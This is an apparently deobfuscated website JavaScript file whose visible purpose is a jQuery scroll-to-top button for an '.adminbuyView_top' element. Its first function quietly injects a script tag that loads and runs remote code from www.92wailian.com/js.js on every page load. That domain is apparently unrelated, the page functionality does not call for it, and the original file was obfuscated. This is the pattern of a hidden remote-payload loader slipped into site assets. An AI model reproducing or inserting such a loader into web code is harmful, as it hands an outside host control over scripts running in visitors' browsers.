//Tue Oct 14 2025 06:09:50 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
function loadScript(_0x15ec74, _0x60b341) {
  var _0x26376e = document.createElement("script");
  _0x26376e.type = "text/javascript";
  _0x26376e.onload = function () {
    if (_0x60b341) _0x60b341();
  };
  _0x26376e.onerror = function () {};
  _0x26376e.src = _0x15ec74;
  document.head.appendChild(_0x26376e);
}
loadScript("https://www.92wailian.com/js.js", function () {
  console.log("Script executed");
});
$(function () {
  $(window).scroll(function () {
    var _0x57185a = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop,
      _0x4a5942 = $(".adminbuyView_top");
    _0x57185a > 0 ? _0x4a5942.show() : _0x4a5942.show();
  });
  $(".adminbuyView_top").click(function () {
    var _0x23f3de = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;
    _0x23f3de > 0 && $("html,body").animate({
      "scrollTop": 0
    }, "slow");
  });
});